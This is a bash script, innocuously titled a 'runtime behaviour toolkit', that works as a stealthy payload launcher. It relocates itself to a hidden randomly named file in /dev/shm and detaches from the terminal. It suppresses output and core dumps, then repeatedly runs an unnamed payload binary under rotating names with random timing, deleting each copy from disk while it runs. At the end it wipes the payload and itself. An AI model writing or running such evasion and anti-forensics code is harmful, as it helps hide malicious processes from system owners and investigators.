#!/bin/bash
# =====================================================================
# god-ram.sh - Runtime behaviour toolkit
# =====================================================================

MIGRATED_MARKER="__MIGRATED__"

if [ "$1" != "$MIGRATED_MARKER" ]; then
    # Parse runtime argument (in hours, default 6)
    RUNTIME_HOURS="${1:-6}"

    # Validate it's a number
    if ! [[ "$RUNTIME_HOURS" =~ ^[0-9]+(\.[0-9]+)?$ ]]; then
        echo "Error: Runtime must be a number (hours)" >&2
        echo "Usage: $0 [hours]" >&2
        echo "Example: $0 8    # Run for 8 hours" >&2
        exit 1
    fi

    STABLE_LOC="/dev/shm/.sys$(cat /dev/urandom | tr -dc 'a-f0-9' | head -c 8)"
    cp "$0" "$STABLE_LOC" || exit 1
    chmod 700 "$STABLE_LOC" || exit 1
    exec setsid "$STABLE_LOC" "$MIGRATED_MARKER" "$RUNTIME_HOURS"
    exit 0
fi

# Extract runtime from argument (passed during migration)
RUNTIME_HOURS="${2:-6}"

exec > /dev/null 2>&1
ulimit -c 0
umask 077
export DISPLAY=:0
export XAUTHORITY=/home/$USER/.Xauthority
export DBUS_SESSION_BUS_ADDRESS="unix:path=/run/user/$(id -u)/bus"

SELF_PATH="$(realpath "$0")"
PAYLOAD_SRC="/dev/shm/home_work/payload.bin"
PAYLOAD_STABLE="/dev/shm/.xbin$$"

if [ -f "$PAYLOAD_SRC" ]; then
    cp "$PAYLOAD_SRC" "$PAYLOAD_STABLE" || exit 1
    chmod +x "$PAYLOAD_STABLE"
else
    rm -f "$SELF_PATH"
    exit 0
fi

cd /dev/shm || exit 1

START=$(date +%s)
BASE=$(awk "BEGIN {print int($RUNTIME_HOURS * 3600)}")
JITTER=120
TOTAL_TIME=$(( BASE + ( $(od -An -N2 -i /dev/urandom | tr -d ' ') % (2 * JITTER + 1) - JITTER) ))
END=$((START + TOTAL_TIME))

CURRENT_PAYLOAD_PID=0

while [ $(date +%s) -lt $END ]; do
    [ ! -f "$PAYLOAD_STABLE" ] && break

    RAND_SUFFIX=$(( $(od -An -N1 -i /dev/urandom | tr -d ' ') % 3 ))
    PAYLOAD="/dev/shm/ex0$RAND_SUFFIX"

    cp "$PAYLOAD_STABLE" "$PAYLOAD" || break
    chmod +x "$PAYLOAD"

    RUN_FOR=$(( $(od -An -N2 -i /dev/urandom | tr -d ' ') % 301 + 180 ))

    JUNK_SLEEP=$(( $(od -An -N1 -i /dev/urandom | tr -d ' ') % 2 ))
    [ "$JUNK_SLEEP" -eq 0 ] && sleep $(( $(od -An -N1 -i /dev/urandom | tr -d ' ') % 3 ))

    setsid "$PAYLOAD" >/dev/null 2>&1 &
    NEW_PAYLOAD_PID=$!

    [ $(( $(od -An -N1 -i /dev/urandom | tr -d ' ') % 3 )) -eq 0 ] && ( sleep 2 & )

    OVERLAP_TIME=$(( $(od -An -N1 -i /dev/urandom | tr -d ' ') % 3 + 3 ))
    sleep "$OVERLAP_TIME"

    rm -f "$PAYLOAD"

    if [ "$CURRENT_PAYLOAD_PID" -ne 0 ]; then
        kill -9 -$CURRENT_PAYLOAD_PID 2>/dev/null
        wait $CURRENT_PAYLOAD_PID 2>/dev/null
    fi

    CURRENT_PAYLOAD_PID=$NEW_PAYLOAD_PID

    REMAINING_TIME=$((RUN_FOR - OVERLAP_TIME))
    [ $REMAINING_TIME -gt 0 ] && sleep "$REMAINING_TIME"
done

if [ "$CURRENT_PAYLOAD_PID" -ne 0 ]; then
    kill -9 -$CURRENT_PAYLOAD_PID 2>/dev/null
    wait $CURRENT_PAYLOAD_PID 2>/dev/null
fi

pkill -9 -f "^/dev/shm/ex0[0-9]$" 2>/dev/null
pgrep -f '^/dev/shm/ex0[0-9]' | xargs -r kill -9 2>/dev/null

sleep 2

rm -f /dev/shm/ex0* 2>/dev/null
rm -f "$PAYLOAD_STABLE"
rm -f "$SELF_PATH"

exit 0
